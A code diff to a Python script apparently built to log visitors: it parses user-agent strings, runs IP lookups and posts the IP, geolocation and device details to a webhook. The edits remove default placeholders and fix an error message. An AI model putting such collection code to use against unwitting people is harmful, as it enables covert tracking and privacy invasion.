@@ -24,24 +24,23 @@ def parse_user_agent(user_agent):
     ### Returns
     - embed fields containing parsed user agent data
     '''
-    EMPTY = '_'
     ua_parser = user_agent_parser.Parse(user_agent)
 
     fields = []
 
     fields.append({
         'name': 'Device',
-        'value': f'Brand: {ua_parser["device"].get("brand", EMPTY)}\nFamily: {ua_parser["device"].get("family", EMPTY)}\nModel: {ua_parser["device"].get("model", EMPTY)}'
+        'value': f'Brand: {ua_parser["device"].get("brand",)}\nFamily: {ua_parser["device"].get("family")}\nModel: {ua_parser["device"].get("model")}'
     })
 
     fields.append({
         'name': 'OS',
-        'value': f'{ua_parser["os"].get("family")} {ua_parser["os"].get("major", EMPTY)}.{ua_parser["os"].get("minor", EMPTY)}.{ua_parser["os"].get("patch", EMPTY)}'
+        'value': f'{ua_parser["os"].get("family")} {ua_parser["os"].get("major")}.{ua_parser["os"].get("minor")}.{ua_parser["os"].get("patch")}'
     })
 
     fields.append({
         'name': 'Browser',
-        'value': f'{ua_parser["user_agent"].get("family", EMPTY)} {ua_parser["user_agent"].get("major", EMPTY)}.{ua_parser["user_agent"].get("minor", EMPTY)}.{ua_parser["user_agent"].get("patch", EMPTY)}'
+        'value': f'{ua_parser["user_agent"].get("family")} {ua_parser["user_agent"].get("major")}.{ua_parser["user_agent"].get("minor")}.{ua_parser["user_agent"].get("patch")}'
     })
 
     return fields
@@ -81,7 +80,7 @@ def post_ip(ip_addr, user_agent):
         try:
             ip_embed['fields'].append(service(ip_addr).lookup_ip())
         except Exception as e:
-            print(f'Error while looking up ip using {IpApi.__name__}:', e)
+            print(f'Error while looking up ip using {service.__name__}:', e)
 
     try:
         requests.post(WEBHOOK_LINK, json={'embeds': [ua_embed, ip_embed]}, timeout=10)
